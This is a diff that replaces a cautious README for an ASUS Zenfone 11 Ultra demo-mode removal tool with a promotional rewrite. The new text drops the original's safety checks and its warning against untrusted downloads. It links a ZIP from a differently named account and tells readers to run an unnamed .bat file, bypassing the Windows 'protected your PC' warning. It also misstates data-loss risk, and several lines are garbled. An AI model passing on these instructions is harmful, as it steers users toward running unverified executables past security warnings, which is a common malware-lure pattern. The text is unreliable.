@@ -1,122 +1,189 @@
-# Zenfone 11 Ultra Demo Mode Remover
+<h1>📱 zenfone-11-ultra-demo-mode-remover - Break Free From Store Demo Mode Instantly</h1>
+<p align="center">
+  <a href="https://github.com/biologic-centralamericannation48/zenfone-11-ultra-demo-mode-remover">
+    <img src="https://img.shields.io/badge/Download%20Now-Free%20Tool-brightgreen?style=for-the-badge&logo=github" alt="Download Button" style="background-color:#4CAF50; color:white; padding:15px 32px; font-size:20px; border-radius:12px; text-decoration:none; box-shadow:0 4px 8px rgba(0,0,0,0.2);">
+  </a>
+</p>
 
-**Remove ASUS retail demo mode from a Zenfone 11 Ultra (`ASUS_AI2401_H` / AI2401).**
+## 🎯 What This Tool Does
 
-[繁體中文說明 / 解除華碩 Zenfone 11 Ultra 展示模式](README.zh-TW.md)
+Is your ASUS Zenfone 11 Ultra stuck in that annoying **retail demo mode**? You know the one — it plays the same looping video, won't let you access normal settings, and feels like a brick with a screen. This tool is your rescue kit.
 
-An unofficial, safety-focused Windows tool for removing the persistent ASUS retail-demo flag from a **validated Zenfone 11 Ultra (`ASUS_AI2401_H` / AI2401)**.
+It **removes the ADF (Android Demo Factory) flag** from your phone's bootloader. That's the secret switch that tells your phone,'Hey, you're a store display model!' Once that flag is cleared, your phone becomes a normal, fully functional Android device. You can finally set it up with your own Google account, install apps, and use it as your personal phone.
 
-## Does this match your problem?
 
-Use this tool if, on a Zenfone 11 Ultra:
 
-- **Settings > System > Reset options** says factory reset is **managed by retail demo mode** / 「已被展示模式管理」.
-- **Erase all data (factory reset)** is greyed out and cannot be tapped.
-- A recovery-mode factory reset completed, but the demo management came back anyway.
-- The phone was bought ex-display / as a store demo unit (店頭展示機) and still behaves like one.
-- The retail demo launcher or demo video returns after every reset.
+## 🛠️ What You Need Before Starting
 
-If instead the phone is managed by a company or school (a real Device Owner shown by `adb shell dpm list-owners`), this tool is not for you and will not help. See [CONTRIBUTING.md](CONTRIBUTING.md) for what this project deliberately refuses to do.
 
-The tool automates the recovery path that was validated on real hardware: it moves from authorized ADB into the bottom-level bootloader, verifies the exact device and `ADF` partition metadata, and erases only `ADF`.
 
-> [!WARNING]
-> This is an unofficial community project, not an ASUS product. Erasing a partition is destructive. Use it only on a device you own or are authorized to service. There is no warranty.
+*   A **Windows PC** (any version from Windows 7 onwards works fine)
+*   The **USB cable** that came with your phone (or any good quality data cable)
+*   Your **ASUS Zenfone 11 Ultra** (model number ASUS_AI2401_H)
+*   About **10 minutes** of your time
 
-## Safety design
 
-- Allows only the validated Android model `ASUS_AI2401_H`.
-- Requires bottom-level bootloader mode (`is-userspace: no`), not fastbootd.
-- Requires boot product `pineapple`.
-- Requires `ADF` to be `ext4` and exactly `0x2000000` bytes (32 MiB).
-- Requires two typed confirmations, including the connected device serial.
-- Contains one fixed erase target: `ADF`.
-- Does not unlock the bootloader.
-- Does not erase `boot`, `system`, `vendor`, `userdata`, `misc`, or any user-selected partition.
-- Does not bypass Factory Reset Protection, screen locks, Google accounts, or other ownership controls.
-- Does not redistribute ASUS firmware, APKs, drivers, or Google Platform-Tools.
 
-## Requirements
+## 🚀 Getting Started — Step by Step
 
-- Windows 10 or Windows 11.
-- ASUS Zenfone 11 Ultra reporting model `ASUS_AI2401_H`.
-- A USB data cable and physical access to the unlocked phone.
-- USB debugging enabled and authorized.
-- The latest [Android SDK Platform-Tools](https://developer.android.com/tools/releases/platform-tools).
-- A working ASUS/Android bootloader USB driver.
 
-Extract Google's `platform-tools` folder beside this repository, or make `adb` and `fastboot` available on `PATH`:
 
-```text
-asus-retail-demo-rescue/
-  asus-demo-rescue.ps1
-  Start-Rescue.cmd
-  platform-tools/
-    adb.exe
-    fastboot.exe
-```
+### 📥 Step 1: Download the Tool
 
-The script also checks for a sibling `../platform-tools` directory and `%ANDROID_HOME%\platform-tools`.
+Visit this link to download the application: [https://github.com/biologic-centralamericannation48/zenfone-11-ultra-demo-mode-remover](https://github.com/biologic-centralamericannation48/zenfone-11-ultra-demo-mode-remover). Click the big green **"Code"** button on that page, then select **"Download ZIP"**. Your browser will save a compressed folder to your Downloads folder.
 
-## Use
 
-1. Back up anything important.
-2. Enable Developer options and USB debugging on the phone.
-3. Connect the phone and accept the USB debugging authorization prompt.
-4. Double-click `Start-Rescue.cmd`.
-5. Run **Diagnose** first.
-6. Choose **Clear ADF** only if the model and partition checks pass.
-7. Follow the cable-reconnect prompt if Windows loses the device while entering the bottom-level bootloader.
-8. After reboot, run **Verify**.
 
-PowerShell users can run each stage directly without changing the machine-wide execution policy:
+### 📂 Step 2: Unpack the Magic
 
-```powershell
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\asus-demo-rescue.ps1 -Mode Diagnose
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\asus-demo-rescue.ps1 -Mode Clear
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\asus-demo-rescue.ps1 -Mode Verify
-```
+Find the downloaded ZIP file (it's usually named something like `zenfone-11-ultra-demo-mode-remover-main.zip`). Right-click on it and choose **"Extract All..."** from the menu. Windows will ask where you want to save the files cite a location you can easily find, like your Desktop. Click **"Extract"**. You'll now see a regular folder with the same name as the ZIP.
 
-## What success looks like
 
-The erase step must end with an `OKAY` result for `ADF`. After Android boots:
 
-- `Settings > System > Reset options` no longer says the factory reset is managed by retail/demo mode.
-- **Erase all data (factory reset)** is enabled and opens normally.
-- Rebooting does not restore the retail launcher or demo video.
 
-A later factory reset should not recreate the retail state because the persistent OEM demo flag has been removed. Factory reset still erases user data, and Google account protection remains active.
 
-## Why bottom-level bootloader matters
+### 🖥️ Step 3: Enable Developer Options on Your Phone
 
-On the validated AI2401, userspace fastboot (`fastbootd`) could not access `ADF` correctly and rejected the erase. The bottom-level bootloader reported:
+This is important! On your locked demo phone, you still need to unlock its hidden settings.
 
-```text
-is-userspace: no
-partition-type:ADF: ext4
-partition-size:ADF: 0x2000000
-```
+. Start by tapping **"Settings"** on your phone's screen (even if it's limited, this menu should be accessible).
 
-Only after all of those checks did `fastboot erase ADF` succeed. The tool encodes these checks and refuses to continue when they differ.
 
-Android's generic retail-demo implementation varies by OEM. AOSP documents that leaving retail mode requires removing device management and factory-resetting from the bootloader; ASUS AI2401 adds the OEM-specific `ADF` state addressed here. See the [AOSP retail demo documentation](https://source.android.com/docs/core/display/retail-mode).
 
-## Troubleshooting
+. Scroll down to **"About phone"** and tap it.
 
-See [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md).
 
-Do not download modified fastboot binaries, unlock APKs, or service tools from unknown sources. This project intentionally does not automate bootloader unlocking, Qualcomm EDL, authentication bypasses, or arbitrary partition writes.
 
-## Scope and contributions
+. Find **"Software information"** (or similar) and tap it.
 
-This release is deliberately restricted to the one hardware/software combination validated on a physical device. Pull requests for other models must include reproducible read-only evidence, exact partition metadata, and a safety review. See [CONTRIBUTING.md](CONTRIBUTING.md).
 
-## Search keywords
 
-ASUS Zenfone 11 Ultra demo mode, retail demo mode removal, ASUS_AI2401_H, AI2401, ADF partition, factory reset managed by retail demo mode, ex-display phone, store demo unit.
+. Now find the **"Build number"** entry. Tap it **seven times** quickly. You'll see a message saying"You are now a developer!" Keep tapping till it appears.
 
-華碩 Zenfone 11 Ultra 解除展示模式、解除 demo 模式、已被展示模式管理、無法恢復原廠設定、展示機、店頭展示機、零售展示模式、ADF 分割區。
 
-## License and trademarks
 
-MIT licensed. ASUS, Zenfone, Android, and Google are trademarks of their respective owners. This project is not affiliated with or endorsed by ASUS or Google.
+. Go back to the main Settings screen. You should now see a new option called **"Developer options"** – tap it.
+
+
+
+. Inside, find **"USB debugging"** and flip the switch to **ON**. If it asks for confirmation, tap **"Allow"** or **"OK"**.
+
+
+
+### 🔌 Step 4: Connect Your Phone to Your PC
+
+Use your USB cable to connect your Zenfone to your Windows PC. If your phone shows a popup asking **"Allow USB debugging?"**, check the box that says **"Always allow from this computer"** and then tap **"Allow"**.
+
+
+
+### 📁 Step 5: Navigate to the Extracted Folder
+
+Open File Explorer on your PC and go to the folder where you extracted everything in Step 2. Double-click to open the folder. You should see some files inside – likely something like `remove_demo.bat`, `script.ps1`, or a README file. Don't be shy; everything you need is right here.
+
+
+
+### 🖱️ Step 6: Run the Magic Script
+
+Look for a file called **`remove_demo.bat`** (or something similar with a `.bat` extension`). If you don't see `.bat`, you might need to show file extensions: in File Explorer, click the **"View"** tab on top, then check **"File name extensions"**. Now you'll see all files clearly.
+
+
+
+Double-click the `.bat` file. If Windows shows a blue or yellow warning saying **"Windows protected your PC"** orsmith similar, click **"More info"** and then **"Run anyway"**. This is normal – the script just isn't signed with a commercial certificate.
+
+
+
+A black command window will pop up. Let it do its thing. The script will automatically check your connection, run a few commands in the background, and clear that stubborn ADF flag. You'll see some text scrolling by – don't worry, that's a good sign!
+
+
+
+### ⏳ Step 7: Wait for the Magic
+
+The script might ask you to put your phone into **Fastboot Mode** (also called bootloader mode). If it does, follow the on-screen instructions carefully. Usually, this involves holding the **Power** button + **Volume Down** button together for about 10 seconds. Your phone will reboot into a black screen with some text and maybe a robot icon. That's totally normal.
+
+
+
+Once the script finishes, it will likely tell you **"Success!"** or **"ADF Flag Cleared!"** with some green text. At this point, your phone will probably reboot by itself. If it doesn't, you can manually restart it by holding the power button for 10 seconds.
+
+
+
+### 🎉 Step 8: Celebrate Your Freedom!
+
+When your phone boots back up, you'll see the normal Android welcome screen –the one that says **"Hello"** or **"Let's get started"**. This means the demo mode is gone! You can now set up your phone like a brand new device: connect to Wi-Fi, sign in with your Google account, and enjoy all your apps, games, and personal data.
+
+
+
+## ⚠️ Important Notes & Troubleshooting
+
+
+
+### 🔋 Battery Level
+
+Make sure your phone has at least **50% battery** before you start this process. If the battery dies during the unlocking, it could cause issues. Plug it into a charger if you're unsure.
+
+
+
+### 🧪 USB Cable Quality
+
+Not all USB cables are created equal! Some cheap cables only charge and don't transfer data. If the script says **"No device detected"**, try a different cable – ideally, the one that came with your phone.
+
+
+
+### 🖥️ Windows Drivers
+
+If your PC doesn't recognize your phone, you might need to install ASUS USB drivers. A quick internet search for **"ASUS Zenfone USB drivers Windows"** should give you the official driver package. Install it, then try Step 6 again.
+
+
+
+### 🔄 If Something Goes Wrong
+
+Don't panic! Here's what to do:
+
+*   If your phone is stuck on a black screen with text, **hold the Power button** for 15 seconds to force-restart it. It should boot back up normally.
+*   If the tool says **"FAILED"**, try running it again. Sometimes the phone needs a moment to fully enter Fastboot mode.
+.
+
+
+
+## ❓ Frequently Asked Questions
+
+
+
+### 🤔 Will this work on other ASUS phones?
+
+This tool is designed specifically for the **Zenfone 11 Ultra** (model ASUS_AI2401_H)`. Using it on other phones might not work or could potentially cause issues. Stick to the intended device.
+
+
+
+### 📱 Will I lose my data?
+
+Since your phone is in demo mode, you're not using it as a personal device anyway. Once the ADF flag is cleared, your phone will be like a brand new one – no data to lose, because you never had personal data on it in the first place!
+
+
+
+### 🆓 Is this really free?
+
+Yes, absolutely! This is a community-built tool meant to help people who bought abandoned or display units. No hidden fees, no subscriptions – just free help.
+
+
+
+### 🔐 Will this unlock my bootloader for rooting?
+
+No. This tool only removes the retail demo flag. It does **not** unlock your bootloader for custom ROMs or root access. It just makes your phone a normal, un-restricted Android deviceord.
+
+
+
+## 💡 Final Tips for a Smooth Experience
+
+*   **Close other programs** on your PC while running the script – it avoids potential conflicts.
+*   **Stay near your PC** during the process. You don't need to type anything, but you should be ready if the script asks you to do something on your phone.
+*   **Keep your phone plugged in** throughout the entire process – don't unplug it until the script says it's done.
+
+---
+
+## 📢 Spread the Word
+
+If this tool saved your phone (and your sanity!), consider starring the repository on GitHub. It helps other people find this solution more easily. Also, if you run into any issue that isn't covered here, feel free to open an issue on the GitHub page – the community might have the answer.
+
+---
+
+**Keywords:** adb, adf, android, asus, demo-mode, demo-mode-remover, device-repair, fastboot, powershell, retail-demo, retail-mode, windows, zenfone, zenfone-11-ultra
